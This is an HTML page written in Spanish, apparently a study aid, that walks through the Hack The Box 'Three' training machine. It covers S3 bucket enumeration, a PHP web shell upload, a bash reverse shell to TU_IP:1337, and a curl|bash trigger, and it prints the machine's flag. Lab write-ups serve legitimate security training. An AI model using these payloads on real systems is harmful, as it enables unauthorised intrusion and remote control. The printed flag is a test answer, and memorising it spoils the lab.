@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Three — Flujo de Ataque</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e17;
+    --card: #111827;
+    --card-border: #1e293b;
+    --green: #22c55e;
+    --green-dim: #16a34a;
+    --green-glow: rgba(34,197,94,0.15);
+    --red: #ef4444;
+    --red-dim: #dc2626;
+    --red-glow: rgba(239,68,68,0.12);
+    --blue: #3b82f6;
+    --blue-glow: rgba(59,130,246,0.12);
+    --yellow: #eab308;
+    --yellow-glow: rgba(234,179,8,0.1);
+    --orange: #f97316;
+    --purple: #a855f7;
+    --text: #e2e8f0;
+    --text-dim: #94a3b8;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Space Grotesk', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  .container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 40px 24px 60px;
+  }
+
+  /* Header */
+  .header {
+    text-align: center;
+    margin-bottom: 48px;
+  }
+
+  .header h1 {
+    font-size: 2.2rem;
+    font-weight: 700;
+    letter-spacing: -0.5px;
+    background: linear-gradient(135deg, var(--green), var(--blue));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 8px;
+  }
+
+  .header p {
+    color: var(--text-dim);
+    font-size: 1rem;
+  }
+
+  .badge {
+    display: inline-block;
+    padding: 4px 12px;
+    border-radius: 20px;
+    font-size: 0.75rem;
+    font-family: var(--mono);
+    font-weight: 600;
+    margin-top: 12px;
+  }
+
+  .badge-green { background: var(--green-glow); color: var(--green); border: 1px solid rgba(34,197,94,0.3); }
+  .badge-red { background: var(--red-glow); color: var(--red); border: 1px solid rgba(239,68,68,0.3); }
+
+  /* Machines Row */
+  .machines {
+    display: grid;
+    grid-template-columns: 1fr 80px 1fr;
+    gap: 0;
+    align-items: start;
+    margin-bottom: 48px;
+  }
+
+  .machine-card {
+    background: var(--card);
+    border: 1px solid var(--card-border);
+    border-radius: 16px;
+    padding: 24px;
+    position: relative;
+  }
+
+  .machine-card h3 {
+    font-size: 1.1rem;
+    font-weight: 700;
+    margin-bottom: 4px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .machine-card .subtitle {
+    color: var(--text-dim);
+    font-size: 0.85rem;
+    margin-bottom: 16px;
+  }
+
+  .terminal-list {
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .terminal-item {
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--card-border);
+    border-radius: 10px;
+    padding: 12px 14px;
+    position: relative;
+  }
+
+  .terminal-item .label {
+    font-size: 0.7rem;
+    font-family: var(--mono);
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .terminal-item code {
+    font-family: var(--mono);
+    font-size: 0.78rem;
+    color: var(--text);
+    display: block;
+    line-height: 1.5;
+  }
+
+  .dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    display: inline-block;
+  }
+
+  .dot-green { background: var(--green); box-shadow: 0 0 6px var(--green); }
+  .dot-red { background: var(--red); box-shadow: 0 0 6px var(--red); }
+  .dot-yellow { background: var(--yellow); box-shadow: 0 0 6px var(--yellow); }
+  .dot-blue { background: var(--blue); box-shadow: 0 0 6px var(--blue); }
+  .dot-orange { background: var(--orange); box-shadow: 0 0 6px var(--orange); }
+  .dot-purple { background: var(--purple); box-shadow: 0 0 6px var(--purple); }
+
+  /* VS separator */
+  .vs-separator {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding-top: 60px;
+    color: var(--text-dim);
+    font-size: 0.8rem;
+    font-family: var(--mono);
+  }
+
+  /* Flow Section */
+  .flow-title {
+    text-align: center;
+    font-size: 1.4rem;
+    font-weight: 700;
+    margin-bottom: 32px;
+    color: var(--text);
+  }
+
+  .flow-steps {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    position: relative;
+  }
+
+  .flow-step {
+    display: grid;
+    grid-template-columns: 56px 1fr;
+    gap: 20px;
+    position: relative;
+  }
+
+  .step-indicator {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .step-number {
+    width: 42px;
+    height: 42px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--mono);
+    font-weight: 700;
+    font-size: 0.9rem;
+    flex-shrink: 0;
+    position: relative;
+    z-index: 2;
+  }
+
+  .step-line {
+    width: 2px;
+    flex-grow: 1;
+    min-height: 20px;
+  }
+
+  .step-content {
+    background: var(--card);
+    border: 1px solid var(--card-border);
+    border-radius: 14px;
+    padding: 20px;
+    margin-bottom: 16px;
+    position: relative;
+    transition: border-color 0.2s;
+  }
+
+  .step-content:hover {
+    border-color: rgba(255,255,255,0.15);
+  }
+
+  .step-content h4 {
+    font-size: 1rem;
+    font-weight: 600;
+    margin-bottom: 6px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .step-content p {
+    color: var(--text-dim);
+    font-size: 0.88rem;
+    line-height: 1.6;
+    margin-bottom: 10px;
+  }
+
+  .step-content p:last-child {
+    margin-bottom: 0;
+  }
+
+  .code-block {
+    background: rgba(0,0,0,0.5);
+    border: 1px solid var(--card-border);
+    border-radius: 8px;
+    padding: 10px 14px;
+    font-family: var(--mono);
+    font-size: 0.78rem;
+    color: var(--green);
+    overflow-x: auto;
+    margin-top: 8px;
+    line-height: 1.6;
+  }
+
+  .where-tag {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 2px 10px;
+    border-radius: 12px;
+    font-size: 0.7rem;
+    font-family: var(--mono);
+    font-weight: 600;
+  }
+
+  .where-parrot { background: var(--green-glow); color: var(--green); border: 1px solid rgba(34,197,94,0.25); }
+  .where-victim { background: var(--red-glow); color: var(--red); border: 1px solid rgba(239,68,68,0.25); }
+  .where-browser { background: var(--blue-glow); color: var(--blue); border: 1px solid rgba(59,130,246,0.25); }
+
+  /* Arrow diagram */
+  .arrow-diagram {
+    background: linear-gradient(135deg, rgba(17,24,39,0.9), rgba(10,14,23,0.95));
+    border: 1px solid var(--card-border);
+    border-radius: 16px;
+    padding: 32px 24px;
+    margin: 40px 0;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .arrow-diagram::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--green), transparent);
+    opacity: 0.4;
+  }
+
+  .arrow-diagram h3 {
+    text-align: center;
+    font-size: 1.1rem;
+    margin-bottom: 28px;
+    color: var(--text);
+  }
+
+  .diagram-flow {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    max-width: 700px;
+    margin: 0 auto;
+  }
+
+  .diagram-row {
+    display: grid;
+    grid-template-columns: 150px 1fr 150px;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .diagram-entity {
+    padding: 10px 14px;
+    border-radius: 10px;
+    font-size: 0.78rem;
+    font-family: var(--mono);
+    font-weight: 600;
+    text-align: center;
+  }
+
+  .entity-parrot {
+    background: var(--green-glow);
+    border: 1px solid rgba(34,197,94,0.3);
+    color: var(--green);
+  }
+
+  .entity-victim {
+    background: var(--red-glow);
+    border: 1px solid rgba(239,68,68,0.3);
+    color: var(--red);
+  }
+
+  .diagram-arrow {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 2px;
+    position: relative;
+  }
+
+  .arrow-line {
+    height: 2px;
+    width: 100%;
+    position: relative;
+  }
+
+  .arrow-line-right {
+    background: linear-gradient(90deg, var(--green), var(--red));
+  }
+
+  .arrow-line-left {
+    background: linear-gradient(90deg, var(--red), var(--green));
+  }
+
+  .arrow-line::after {
+    content: '';
+    position: absolute;
+    top: -4px;
+    width: 0;
+    height: 0;
+    border-top: 5px solid transparent;
+    border-bottom: 5px solid transparent;
+  }
+
+  .arrow-line-right::after {
+    right: 0;
+    border-left: 8px solid var(--red);
+  }
+
+  .arrow-line-left::after {
+    left: 0;
+    border-right: 8px solid var(--green);
+  }
+
+  .arrow-label {
+    font-size: 0.7rem;
+    font-family: var(--mono);
+    color: var(--text-dim);
+    white-space: nowrap;
+  }
+
+  .step-num-label {
+    font-size: 0.65rem;
+    font-family: var(--mono);
+    color: var(--yellow);
+    font-weight: 600;
+  }
+
+  /* Color variants for steps */
+  .step-green .step-number { background: var(--green-glow); color: var(--green); border: 2px solid rgba(34,197,94,0.4); }
+  .step-green .step-line { background: linear-gradient(to bottom, rgba(34,197,94,0.3), rgba(34,197,94,0.05)); }
+
+  .step-blue .step-number { background: var(--blue-glow); color: var(--blue); border: 2px solid rgba(59,130,246,0.4); }
+  .step-blue .step-line { background: linear-gradient(to bottom, rgba(59,130,246,0.3), rgba(59,130,246,0.05)); }
+
+  .step-yellow .step-number { background: var(--yellow-glow); color: var(--yellow); border: 2px solid rgba(234,179,8,0.4); }
+  .step-yellow .step-line { background: linear-gradient(to bottom, rgba(234,179,8,0.3), rgba(234,179,8,0.05)); }
+
+  .step-red .step-number { background: var(--red-glow); color: var(--red); border: 2px solid rgba(239,68,68,0.4); }
+  .step-red .step-line { background: linear-gradient(to bottom, rgba(239,68,68,0.3), rgba(239,68,68,0.05)); }
+
+  .step-purple .step-number { background: rgba(168,85,247,0.12); color: var(--purple); border: 2px solid rgba(168,85,247,0.4); }
+  .step-purple .step-line { background: linear-gradient(to bottom, rgba(168,85,247,0.3), rgba(168,85,247,0.05)); }
+
+  .step-orange .step-number { background: rgba(249,115,22,0.12); color: var(--orange); border: 2px solid rgba(249,115,22,0.4); }
+  .step-orange .step-line { background: linear-gradient(to bottom, rgba(249,115,22,0.3), rgba(249,115,22,0.05)); }
+
+  .highlight { color: var(--green); font-weight: 600; }
+  .highlight-red { color: var(--red); font-weight: 600; }
+  .highlight-blue { color: var(--blue); font-weight: 600; }
+  .highlight-yellow { color: var(--yellow); font-weight: 600; }
+
+  /* Footer */
+  .footer {
+    text-align: center;
+    padding: 32px 0 0;
+    color: var(--text-dim);
+    font-size: 0.82rem;
+  }
+
+  .flag-box {
+    display: inline-block;
+    background: var(--green-glow);
+    border: 1px solid rgba(34,197,94,0.3);
+    border-radius: 10px;
+    padding: 12px 24px;
+    font-family: var(--mono);
+    font-size: 0.9rem;
+    color: var(--green);
+    margin-top: 12px;
+  }
+
+  @media (max-width: 768px) {
+    .machines { grid-template-columns: 1fr; gap: 16px; }
+    .vs-separator { padding: 0; }
+    .diagram-row { grid-template-columns: 100px 1fr 100px; }
+    .header h1 { font-size: 1.6rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- Header -->
+  <div class="header">
+    <h1>HTB Three — Flujo de Ataque Completo</h1>
+    <p>Explotación de bucket S3 mal configurado + Reverse Shell</p>
+    <div>
+      <span class="badge badge-green">🐧 Tu Parrot</span>
+      <span class="badge badge-red" style="margin-left:8px">🎯 Máquina Víctima</span>
+    </div>
+  </div>
+
+  <!-- Two machines overview -->
+  <div class="machines">
+    <div class="machine-card" style="border-color: rgba(34,197,94,0.25);">
+      <h3><span class="dot dot-green"></span> Tu Parrot OS</h3>
+      <div class="subtitle">Atacante — 3 terminales abiertas</div>
+      <ul class="terminal-list">
+        <li class="terminal-item">
+          <div class="label"><span class="dot dot-yellow" style="width:6px;height:6px"></span> Terminal 1</div>
+          <code>echo '#!/bin/bash ...' > shell.sh</code>
+        </li>
+        <li class="terminal-item">
+          <div class="label"><span class="dot dot-blue" style="width:6px;height:6px"></span> Terminal 2 — Servidor Web</div>
+          <code>python3 -m http.server 8000</code>
+        </li>
+        <li class="terminal-item">
+          <div class="label"><span class="dot dot-purple" style="width:6px;height:6px"></span> Terminal 3 — Listener</div>
+          <code>nc -nvlp 1337</code>
+        </li>
+      </ul>
+    </div>
+
+    <div class="vs-separator">
+      ⚡
+    </div>
+
+    <div class="machine-card" style="border-color: rgba(239,68,68,0.25);">
+      <h3><span class="dot dot-red"></span> Víctima (Three)</h3>
+      <div class="subtitle">10.129.227.248 — thetoppers.htb</div>
+      <ul class="terminal-list">
+        <li class="terminal-item">
+          <div class="label"><span class="dot dot-red" style="width:6px;height:6px"></span> Servicios</div>
+          <code>Puerto 22 → SSH<br>Puerto 80 → Apache + PHP</code>
+        </li>
+        <li class="terminal-item">
+          <div class="label"><span class="dot dot-orange" style="width:6px;height:6px"></span> S3 Bucket</div>
+          <code>s3.thetoppers.htb<br>→ Webroot del sitio (sin auth)</code>
+        </li>
+        <li class="terminal-item">
+          <div class="label"><span class="dot dot-yellow" style="width:6px;height:6px"></span> Flag</div>
+          <code>/var/www/flag.txt</code>
+        </li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Arrow Diagram - The Key Visual -->
+  <div class="arrow-diagram">
+    <h3>🔄 Cómo funciona la Reverse Shell</h3>
+    <div class="diagram-flow">
+
+      <div class="diagram-row">
+        <div class="diagram-entity entity-parrot">🐧 Parrot<br><small>python :8000</small></div>
+        <div class="diagram-arrow">
+          <div class="step-num-label">PASO 1 → curl descarga shell.sh</div>
+          <div class="arrow-line arrow-line-right"></div>
+        </div>
+        <div class="diagram-entity entity-victim">🎯 Víctima<br><small>shell.php</small></div>
+      </div>
+
+      <div class="diagram-row">
+        <div class="diagram-entity entity-parrot">🐧 Parrot<br><small>python :8000</small></div>
+        <div class="diagram-arrow">
+          <div class="arrow-line arrow-line-left"></div>
+          <div class="step-num-label">PASO 2 ← víctima recibe shell.sh</div>
+        </div>
+        <div class="diagram-entity entity-victim">🎯 Víctima<br><small>curl recibe</small></div>
+      </div>
+
+      <div class="diagram-row">
+        <div class="diagram-entity entity-parrot">🐧 Parrot<br><small>nc -nvlp 1337</small></div>
+        <div class="diagram-arrow">
+          <div class="arrow-line arrow-line-left"></div>
+          <div class="step-num-label">PASO 3 ← bash ejecuta → conecta a ti</div>
+        </div>
+        <div class="diagram-entity entity-victim">🎯 Víctima<br><small>bash shell.sh</small></div>
+      </div>
+
+      <div class="diagram-row">
+        <div class="diagram-entity entity-parrot" style="background: rgba(168,85,247,0.12); border-color: rgba(168,85,247,0.3); color: var(--purple);">🎉 Parrot<br><small>¡shell obtenida!</small></div>
+        <div class="diagram-arrow">
+          <div class="step-num-label">PASO 4 ↔ Shell interactiva establecida</div>
+          <div class="arrow-line" style="background: linear-gradient(90deg, var(--purple), var(--purple)); height: 2px;"></div>
+        </div>
+        <div class="diagram-entity entity-victim" style="background: rgba(168,85,247,0.12); border-color: rgba(168,85,247,0.3); color: var(--purple);">🔓 Víctima<br><small>pwned</small></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step by step flow -->
+  <h2 class="flow-title">📋 Paso a Paso Detallado</h2>
+
+  <div class="flow-steps">
+
+    <!-- Step 1 -->
+    <div class="flow-step step-green">
+      <div class="step-indicator">
+        <div class="step-number">1</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-content">
+        <h4>Escaneo y Enumeración <span class="where-tag where-parrot">Tu Parrot</span></h4>
+        <p>Escaneas la IP de la víctima para descubrir servicios. Encuentras el dominio <span class="highlight">thetoppers.htb</span> y el subdominio <span class="highlight">s3.thetoppers.htb</span> (bucket S3).</p>
+        <div class="code-block">sudo nmap -sV &lt;IP_VICTIMA&gt;<br>gobuster vhost -w wordlist.txt -u http://thetoppers.htb</div>
+      </div>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="flow-step step-blue">
+      <div class="step-indicator">
+        <div class="step-number">2</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-content">
+        <h4>Explorar el Bucket S3 <span class="where-tag where-parrot">Tu Parrot</span></h4>
+        <p>Usas <span class="highlight">awscli</span> para listar el contenido del bucket. Descubres que es el <span class="highlight-yellow">webroot</span> del sitio (contiene index.php). ¡Todo lo que subas será accesible desde el navegador!</p>
+        <div class="code-block">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb<br><span style="color: var(--text-dim)"># → images/ .htaccess index.php</span></div>
+      </div>
+    </div>
+
+    <!-- Step 3 -->
+    <div class="flow-step step-yellow">
+      <div class="step-indicator">
+        <div class="step-number">3</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-content">
+        <h4>Subir Web Shell PHP <span class="where-tag where-parrot">Tu Parrot</span> → <span class="where-tag where-victim">Víctima</span></h4>
+        <p>Creas un archivo PHP que ejecuta comandos y lo subes al bucket. Ahora puedes ejecutar <span class="highlight-red">cualquier comando</span> en la víctima a través de la URL.</p>
+        <div class="code-block">echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php<br>aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb<br><br><span style="color: var(--text-dim)"># Prueba: http://thetoppers.htb/shell.php?cmd=id</span><br><span style="color: var(--yellow)"># → uid=33(www-data) ✓ RCE confirmado</span></div>
+      </div>
+    </div>
+
+    <!-- Step 4 -->
+    <div class="flow-step step-green">
+      <div class="step-indicator">
+        <div class="step-number">4</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-content">
+        <h4>Crear shell.sh <span class="where-tag where-parrot">Tu Parrot · Terminal 1</span></h4>
+        <p>Creas el script de reverse shell. Este archivo se va a ejecutar <span class="highlight-red">en la víctima</span>, pero le dice que se conecte <span class="highlight">a tu Parrot</span>. Por eso la IP es la tuya.</p>
+        <div class="code-block">echo '#!/bin/bash<br>bash -i >&amp; /dev/tcp/<span style="color:var(--green)">TU_IP</span>/1337 0>&amp;1' > shell.sh<br><br><span style="color: var(--text-dim)"># bash -i          → shell interactiva</span><br><span style="color: var(--text-dim)"># >& /dev/tcp/IP/  → envía output a tu máquina</span><br><span style="color: var(--text-dim)"># 0>&1             → también redirige el input</span></div>
+      </div>
+    </div>
+
+    <!-- Step 5 -->
+    <div class="flow-step step-blue">
+      <div class="step-indicator">
+        <div class="step-number">5</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-content">
+        <h4>Montar Servidor Web <span class="where-tag where-parrot">Tu Parrot · Terminal 2</span></h4>
+        <p>Conviertes tu Parrot en un <span class="highlight-blue">servidor web temporal</span>. Sirve los archivos del directorio actual. La víctima descargará shell.sh desde aquí. <strong>No cierres esta terminal.</strong></p>
+        <div class="code-block"><span style="color: var(--text-dim)"># Ejecutar desde el directorio donde está shell.sh</span><br>python3 -m http.server 8000<br><span style="color: var(--yellow)"># → Serving HTTP on 0.0.0.0 port 8000</span></div>
+      </div>
+    </div>
+
+    <!-- Step 6 -->
+    <div class="flow-step step-purple">
+      <div class="step-indicator">
+        <div class="step-number">6</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-content">
+        <h4>Iniciar Listener <span class="where-tag where-parrot">Tu Parrot · Terminal 3</span></h4>
+        <p>Netcat se queda <span class="highlight">escuchando</span> en el puerto 1337. Cuando la víctima ejecute shell.sh, se conectará aquí y verás la shell. <strong>No cierres esta terminal.</strong></p>
+        <div class="code-block">nc -nvlp 1337<br><span style="color: var(--yellow)"># → Listening on 0.0.0.0:1337</span></div>
+      </div>
+    </div>
+
+    <!-- Step 7 -->
+    <div class="flow-step step-red">
+      <div class="step-indicator">
+        <div class="step-number">7</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-content">
+        <h4>¡Disparar el Ataque! <span class="where-tag where-browser">Navegador</span></h4>
+        <p>Este es el momento clave. Visitas la URL y todo se encadena:</p>
+        <div class="code-block">http://thetoppers.htb/shell.php?cmd=curl%20<span style="color:var(--green)">TU_IP</span>:8000/shell.sh|bash</div>
+        <p style="margin-top: 12px;">
+          <span class="highlight-blue">curl TU_IP:8000/shell.sh</span> → la víctima descarga shell.sh desde tu servidor Python<br>
+          <span class="highlight-yellow">|</span> → pipe: pasa el contenido al siguiente comando<br>
+          <span class="highlight-red">bash</span> → ejecuta shell.sh en la víctima → conecta de vuelta a tu netcat
+        </p>
+      </div>
+    </div>
+
+    <!-- Step 8 -->
+    <div class="flow-step step-orange">
+      <div class="step-indicator">
+        <div class="step-number">8</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-content">
+        <h4>🏴 Flag Capturada <span class="where-tag where-parrot">Tu Parrot · Terminal 3</span></h4>
+        <p>En la Terminal 3 (netcat) ahora tienes una shell interactiva de la víctima. Lees la flag y ¡máquina completada!</p>
+        <div class="code-block">www-data@three:/var/www/html$ cat /var/www/flag.txt<br><span style="color: var(--green)">a980d99281a28d638ac68b9bf9453c2b</span></div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>HTB Starting Point · Three · Dificultad: Very Easy</p>
+    <div class="flag-box">🏴 a980d99281a28d638ac68b9bf9453c2b</div>
+  </div>
+
+</div>
+
+</body>
+</html>
